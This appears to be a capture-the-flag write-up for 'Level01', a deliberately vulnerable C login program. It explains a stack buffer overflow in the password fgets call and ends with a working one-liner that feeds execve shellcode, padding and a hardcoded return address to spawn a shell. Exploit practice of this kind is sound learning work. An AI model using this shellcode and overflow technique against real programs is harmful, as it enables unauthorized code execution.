
# Level01
## Code
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char username[100];

int verify_user_name()
{
  puts("verifying username....\n");
  return memcmp(username, "dat_wil", 7) != 0;
}

int verify_user_pass(const void *a1)
{
  return memcmp(a1, "admin", 5) != 0;
}

int main(int argc, const char **argv, const char **envp)
{
    char s[64];
    int  exists; 

    memset(s, 0, sizeof(s));
    exists = 0;
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(username, 256, stdin);
    exists = verify_user_name();
    if (exists)
    {
        puts("nope, incorrect username...\n");
    }
    else
    {
        puts("Enter Password: ");
        fgets(s, 100, stdin);
        exists = verify_user_pass(s);
        puts("nope, incorrect password...\n");
    }
    return 1;
}
```
## Explanation
- This program asks for a username and a password.

- When decompiling the code, we can easily see what it expects as username and password, respectivey "dat_wil" and "admin"

- The problem is that the return of the function `verify_user_pass()` doesn't change anything, the program will print `"nope, incorrect password..."` no matter what you give it.

- But the interesting part is that the `fgets()` for the password writes up to 100 bytes in a 64 bytes buffer, therefore we can easily overflow this to reach the return address of the `main()` function.

- Thanks to https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ , we managed to find the offset of the return address by provoking a segfault with gdb. This offset is 80 bytes.

- So all we had to do was give "dat_wil" as `argv[1]` and a shellcode followed by the necessary amount of random bytes to reach the offset of 80, followed by the address of our string buffer as `argv[2]`.
## Exploit

```
(python -c'print "dat_wil"' ; python -c'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 56 + "\xec\xd6\xff\xff"' ; cat)  | ./level01
```

